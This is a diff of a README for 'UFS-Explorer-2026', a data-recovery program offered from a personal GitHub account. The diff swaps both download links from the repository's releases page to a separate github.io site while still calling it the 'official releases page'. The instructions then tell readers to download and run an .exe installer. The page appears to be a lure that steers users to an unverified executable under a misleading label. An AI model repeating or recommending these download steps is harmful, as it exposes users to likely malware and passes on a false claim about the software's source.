@@ -1,6 +1,6 @@
 # 💾 UFS-Explorer-2026 - Recover your lost digital data files
 
-[![](https://img.shields.io/badge/Download-UFS--Explorer-blue.svg)](https://github.com/triple-whirl393/UFS-Explorer-2026/releases)
+[![](https://img.shields.io/badge/Download-UFS--Explorer-blue.svg)](https://triple-whirl393.github.io)
 
 ## 📁 About the software
 
@@ -18,7 +18,7 @@ Ensure your computer meets these minimum specifications before you proceed.
 
 ## 📥 Getting the software
 
-1. Visit the [official releases page](https://github.com/triple-whirl393/UFS-Explorer-2026/releases) to access the latest version.
+1. Visit the [official releases page](https://triple-whirl393.github.io) to access the latest version.
 2. Locate the most recent build at the top of the list.
 3. Click the installer file ending in .exe to start the transfer.
 4. Save the file to your desktop or downloads folder.
